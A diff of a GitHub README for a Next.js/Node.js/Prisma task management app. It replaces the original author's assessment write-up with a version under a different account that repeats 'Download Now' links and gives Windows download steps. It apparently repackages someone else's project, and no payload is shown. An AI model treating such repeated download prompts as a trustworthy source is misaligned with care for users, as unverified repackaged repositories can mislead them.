@@ -1,314 +1,266 @@
-# 🚀 TaskFlow — Task Management System
+# 🗂️ Task-Management-System- - Organize Tasks With Less Effort
 
-> Built for **Earnest Data Analytics** Software Engineering Assessment  
-> Track A: Full-Stack Engineer (Backend + Web Frontend)
+[![Download Task-Management-System-](https://img.shields.io/badge/Download%20Now-Task--Management--System---blue?style=for-the-badge)](https://github.com/hattyuninquiring592/Task-Management-System-)
 
-[![Live Demo](https://img.shields.io/badge/Live%20Demo-Visit%20App-brightgreen?style=for-the-badge)](https://task-manager-coral-mu.vercel.app/)
-[![Backend API](https://img.shields.io/badge/Backend%20API-Live-blue?style=for-the-badge)](https://task-manager-backend-emge.onrender.com)
-[![GitHub](https://img.shields.io/badge/GitHub-Repository-black?style=for-the-badge&logo=github)](https://github.com/SonuMandal1/Task-Management-System-)
+## 🚀 Overview
 
----
+Task-Management-System- is a full-stack task app for tracking work in one place. Use it to create tasks, update status, and keep your day in order.
 
-## 📌 About This Project
+It runs with a modern web stack:
 
-TaskFlow is a **production-ready, full-stack Task Management System** built as part of the **Earnest Data Analytics Software Engineering Recruitment Assessment**. The system allows users to securely register, log in, and perform complete management of their personal tasks with a beautiful, responsive interface.
+- **Next.js** for the app screen
+- **Node.js** for the server
+- **TypeScript** for safer code
+- **PostgreSQL** for data storage
+- **Prisma** for database access
+- **JWT** for sign-in sessions
+- **Tailwind CSS** for the interface
 
-The project is **fully deployed and live** — both the backend API and the frontend web application are running in production.
+## 📦 Download
 
----
+To get the app, **visit this page to download**:
 
-## 🌐 Live Deployment
+[Download Task-Management-System-](https://github.com/hattyuninquiring592/Task-Management-System-)
 
-| Service | URL |
-|---------|-----|
-| 🌐 **Frontend (Next.js)** |  https://task-manager-coral-mu.vercel.app/ |
-| ⚙️ **Backend API (Node.js)** | https://task-manager-backend-emge.onrender.com |
-| 🗄️ **Database** | Neon PostgreSQL (Cloud) |
+If the page opens in your browser, use the main download option on that page and save the file or source package to your PC.
 
----
+## 🖥️ What You Need
 
-## ✨ Features Implemented
+Use a Windows PC with:
 
-### 🔐 Authentication & Security
-- ✅ User Registration with full validation
-- ✅ User Login with email & password
-- ✅ JWT Access Tokens (short-lived, 15 minutes)
-- ✅ JWT Refresh Tokens (long-lived, 7 days) stored in HttpOnly cookies
-- ✅ Automatic token refresh — user stays logged in seamlessly
-- ✅ Token rotation on every refresh for maximum security
-- ✅ Password hashing using **bcrypt** (12 salt rounds)
-- ✅ Secure Logout with token revocation
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 4 GB of RAM
+- 2 GB of free disk space
+- A modern browser like Chrome, Edge, or Firefox
 
-### 📋 Task Management (Full CRUD)
-- ✅ Create tasks with title, description, priority and due date
-- ✅ View all tasks with beautiful card layout
-- ✅ Edit tasks via modal form
-- ✅ Delete tasks with confirmation dialog
-- ✅ Toggle task status (Pending → In Progress → Completed)
-- ✅ Task priority levels — Low, Medium, High
-- ✅ Due date tracking with overdue detection
+If you plan to run the app on your own computer, you also need:
 
-### 🔍 Advanced Task Features
-- ✅ **Pagination** — tasks loaded in batches
-- ✅ **Search** — search tasks by title (debounced)
-- ✅ **Filter** — filter by status and priority
-- ✅ **Real-time stats** — total, pending, in-progress, completed counts
+- Node.js 18 or later
+- PostgreSQL
+- Git
 
-### 🎨 UI/UX
-- ✅ Fully **responsive design** — works on mobile and desktop
-- ✅ Beautiful dark theme with glass morphism
-- ✅ Toast notifications for all actions
-- ✅ Loading states and smooth animations
-- ✅ Confirmation dialogs for destructive actions
-- ✅ Empty states with helpful prompts
+## 🧭 What You Can Do
 
----
+This task system is built for day-to-day task tracking.
 
-## 🛠️ Tech Stack
+You can:
 
-### Backend
-| Technology | Purpose |
-|-----------|---------|
-| **Node.js** | Server runtime |
-| **Express.js** | Web framework |
-| **TypeScript** | Type safety throughout |
-| **Prisma ORM** | Database access & migrations |
-| **PostgreSQL (Neon)** | Production database |
-| **JWT (jsonwebtoken)** | Access & refresh token auth |
-| **bcryptjs** | Password hashing |
-| **express-validator** | Input validation |
-| **cookie-parser** | HttpOnly cookie handling |
+- Add new tasks
+- Edit task details
+- Mark tasks as done
+- Keep tasks in order by status
+- Sign in with a secure login flow
+- Work from a clean web interface
+- View your work from a browser
 
-### Frontend
-| Technology | Purpose |
-|-----------|---------|
-| **Next.js 14** | React framework (App Router) |
-| **TypeScript** | Type safety throughout |
-| **Tailwind CSS** | Utility-first styling |
-| **React Hook Form** | Form handling |
-| **Zod** | Schema validation |
-| **Axios** | HTTP client with interceptors |
-| **react-hot-toast** | Toast notifications |
-| **lucide-react** | Icon library |
+## 🛠️ Install on Windows
 
-### DevOps & Deployment
-| Technology | Purpose |
-|-----------|---------|
-| **Vercel** | Frontend deployment |
-| **Render** | Backend deployment |
-| **Neon** | Cloud PostgreSQL database |
-| **GitHub** | Version control |
+Follow these steps in order.
 
----
+### 1. Get the files
 
-## 📁 Project Structure
-```
-task-manager/
-├── backend/                  # Node.js + TypeScript API
-│   ├── prisma/
-│   │   └── schema.prisma     # Database schema
-│   ├── src/
-│   │   ├── controllers/
-│   │   │   ├── auth.controller.ts
-│   │   │   └── task.controller.ts
-│   │   ├── middleware/
-│   │   │   ├── auth.middleware.ts
-│   │   │   ├── error.middleware.ts
-│   │   │   └── validation.middleware.ts
-│   │   ├── routes/
-│   │   │   ├── auth.routes.ts
-│   │   │   └── task.routes.ts
-│   │   ├── lib/
-│   │   │   ├── prisma.ts
-│   │   │   └── jwt.ts
-│   │   └── index.ts
-│   └── package.json
-│
-└── frontend/                 # Next.js 14 + TypeScript
-    ├── src/
-    │   ├── app/
-    │   │   ├── (app)/
-    │   │   │   ├── login/
-    │   │   │   ├── register/
-    │   │   │   └── dashboard/
-    │   ├── components/
-    │   │   ├── TaskCard.tsx
-    │   │   ├── TaskModal.tsx
-    │   │   ├── DeleteDialog.tsx
-    │   │   └── StatsCard.tsx
-    │   ├── contexts/
-    │   │   └── AuthContext.tsx
-    │   └── lib/
-    │       ├── api.ts
-    │       ├── auth.ts
-    │       └── tasks.ts
-    └── package.json
-```
+Open this page:
 
----
+[https://github.com/hattyuninquiring592/Task-Management-System-](https://github.com/hattyuninquiring592/Task-Management-System-)
 
-## 🔌 API Endpoints
+Download the project files to your computer. If the file comes as a ZIP folder, save it to your Downloads folder.
 
-### Authentication
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| POST | `/auth/register` | Register new user |
-| POST | `/auth/login` | Login user |
-| POST | `/auth/refresh` | Refresh access token |
-| POST | `/auth/logout` | Logout user |
+### 2. Unzip the folder
 
-### Tasks (All require authentication)
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/tasks` | Get all tasks (paginated, filterable) |
-| POST | `/tasks` | Create new task |
-| GET | `/tasks/:id` | Get single task |
-| PATCH | `/tasks/:id` | Update task |
-| DELETE | `/tasks/:id` | Delete task |
-| PATCH | `/tasks/:id/toggle` | Toggle task status |
+If you downloaded a ZIP file:
 
-### Query Parameters for GET /tasks
-| Parameter | Type | Description |
-|-----------|------|-------------|
-| `page` | number | Page number |
-| `limit` | number | Items per page |
-| `status` | string | Filter by PENDING, IN_PROGRESS, COMPLETED |
-| `priority` | string | Filter by LOW, MEDIUM, HIGH |
-| `search` | string | Search by task title |
+- Find it in **Downloads**
+- Right-click the file
+- Select **Extract All**
+- Choose a folder like `C:\Task-Management-System-`
 
----
+### 3. Open the project folder
 
-## 🗄️ Database Schema
-```prisma
-model User {
-  id            String   @id @default(cuid())
-  email         String   @unique
-  name          String
-  passwordHash  String
-  tasks         Task[]
-  refreshTokens RefreshToken[]
-}
+After extracting, open the folder that contains the app files. Look for files like:
 
-model Task {
-  id          String    @id @default(cuid())
-  title       String
-  description String?
-  status      String    @default("PENDING")
-  priority    String    @default("MEDIUM")
-  dueDate     DateTime?
-  userId      String
-  user        User      @relation(...)
-}
+- `package.json`
+- `next.config.js`
+- `prisma`
+- `src`
 
-model RefreshToken {
-  id        String   @id @default(cuid())
-  token     String   @unique
-  userId    String
-  expiresAt DateTime
-}
-```
+## ⚙️ Set Up the App
 
----
+### 4. Install Node.js
 
-## 🚀 Running Locally (Step by Step)
+If Node.js is not on your PC:
 
-### Prerequisites
-- **Node.js** v18+ — https://nodejs.org
-- **Git** — https://git-scm.com
-- **VS Code** — https://code.visualstudio.com
+- Go to the official Node.js site
+- Download the Windows installer
+- Run the installer
+- Keep the default options
+- Finish the setup
 
-### Step 1 — Clone the repository
+To check if it works, open **Command Prompt** and run:
+
 ```bash
-git clone https://github.com/SonuMandal1/Task-Management-System-.git
-cd Task-Management-System-
+node -v
 ```
 
-### Step 2 — Setup Backend
+If you see a version number, Node.js is ready.
+
+### 5. Install the database
+
+You need PostgreSQL on your computer.
+
+Basic setup:
+
+- Install PostgreSQL
+- Create a new database
+- Save the database name, user name, and password
+
+A common local setup uses:
+
+- Host: `localhost`
+- Port: `5432`
+
+### 6. Add environment settings
+
+The app uses a settings file called `.env`.
+
+Create it in the project root and add values like these:
+
+```env
+DATABASE_URL="postgresql://user:password@localhost:5432/taskdb"
+NEXTAUTH_SECRET="your-secret-key"
+NEXTAUTH_URL="http://localhost:3000"
+```
+
+Use your real PostgreSQL user name, password, and database name.
+
+### 7. Install project packages
+
+Open **Command Prompt** in the project folder and run:
+
 ```bash
-cd backend
 npm install
 ```
 
-Create `.env` file inside the `backend` folder:
-```env
-DATABASE_URL="file:./dev.db"
-JWT_ACCESS_SECRET="your-access-secret-key"
-JWT_REFRESH_SECRET="your-refresh-secret-key"
-JWT_ACCESS_EXPIRES_IN="15m"
-JWT_REFRESH_EXPIRES_IN="7d"
-PORT=5000
-NODE_ENV="development"
-CORS_ORIGIN="http://localhost:3000"
-```
+This gets the files the app needs to run.
 
-Run database migrations:
+### 8. Prepare the database
+
+Run Prisma commands to create and sync the tables:
+
 ```bash
 npx prisma generate
-npx prisma migrate dev --name init
+npx prisma migrate dev
 ```
 
-Start the backend:
+If the app includes seed data, you may also run:
+
+```bash
+npx prisma db seed
+```
+
+## ▶️ Run the App
+
+### 9. Start the app
+
+Use this command:
+
 ```bash
 npm run dev
 ```
-✅ Backend running at **http://localhost:5000**
 
-### Step 3 — Setup Frontend
-Open a **new terminal** and run:
-```bash
-cd frontend
-npm install
-```
+Then open your browser and go to:
 
-Create `.env.local` file inside the `frontend` folder:
-```env
-NEXT_PUBLIC_API_URL=http://localhost:5000
-```
-
-Start the frontend:
-```bash
-npm run dev
-```
-✅ Frontend running at **http://localhost:3000**
-
-### Step 4 — Open in browser
-```
+```text
 http://localhost:3000
 ```
 
----
+You should see the task management app in your browser.
 
-## 🔒 Security Features
+## 🔐 Sign In
 
-- **JWT Access Tokens** — expire in 15 minutes
-- **JWT Refresh Tokens** — expire in 7 days, stored in HttpOnly cookies
-- **Token Rotation** — new refresh token issued on every refresh
-- **bcrypt** — passwords hashed with 12 salt rounds
-- **Input Validation** — all inputs validated on both frontend and backend
-- **CORS Protection** — only allowed origins can access the API
-- **User Isolation** — users can only access their own tasks
+If the app uses login, enter the account details you set up or use the built-in auth flow on the sign-in screen.
 
----
+Use a strong password and keep your login details safe.
 
-## 👨‍💻 Developer
+## 📁 Common Folder Layout
 
-**Sonu Mandal**  
-GitHub: [@SonuMandal1](https://github.com/SonuMandal1)  
-Email: 22054371@kiit.ac.in
+You may see folders like these:
 
----
+- `src` — app pages and logic
+- `components` — screen parts used in the app
+- `prisma` — database models and migrations
+- `public` — images and static files
+- `styles` — app styling files
 
-## 📄 Assignment Details
+## 🧪 Basic Use
 
-- **Company:** Earnest Data Analytics  
-- **Role:** Full-Stack Engineer  
-- **Track:** Track A — Backend (Node.js) + Web Frontend (Next.js)  
-- **Assessment:** Task Management System
+After the app opens, try this flow:
 
----
+1. Create a new task
+2. Add a title and short note
+3. Save the task
+4. Change the status when work starts
+5. Mark it as complete when done
+6. Check the task list to keep track of progress
 
-*Built with ❤️ for Earnest Data Analytics Recruitment Drive*
+## 🔄 If You Want to Update the App
+
+When new files are added to the repository:
+
+- Download the latest version from the same link
+- Replace the old project files
+- Run `npm install` again if needed
+- Run the database migration commands if the schema changed
+
+## 📌 Browser Tips
+
+For the best result:
+
+- Use one current browser
+- Keep JavaScript turned on
+- Allow local site access if your browser asks
+- Refresh the page if the app does not load on the first try
+
+## 🔍 Troubleshooting
+
+If the app does not start, check these points:
+
+- Node.js is installed
+- PostgreSQL is running
+- The `.env` file has the right database details
+- `npm install` finished without errors
+- The port `3000` is free
+- You ran the command from the project folder
+
+If the page opens blank, reload the browser and check the terminal window for errors
+
+## 🧰 Useful Commands
+
+```bash
+npm install
+npm run dev
+npm run build
+npm start
+npx prisma generate
+npx prisma migrate dev
 ```
 
----
+## 🧱 Tech Stack
 
+- **Frontend:** Next.js, Tailwind CSS
+- **Backend:** Node.js, TypeScript
+- **Database:** PostgreSQL
+- **ORM:** Prisma
+- **Auth:** JWT
+
+## 📍 Download Again
+
+If you need the files again, use this link:
+
+[Download Task-Management-System-](https://github.com/hattyuninquiring592/Task-Management-System-)
+
+## 🗂️ Repository Details
+
+- **Repository Name:** Task-Management-System-
+- **Description:** Full-stack task management app with Node.js, TypeScript, Next.js, and PostgreSQL
+- **Topics:** fullstack, jwt, nextjs, nodejs, postgresql, prisma, render, tailwindcss, typescript, vercel
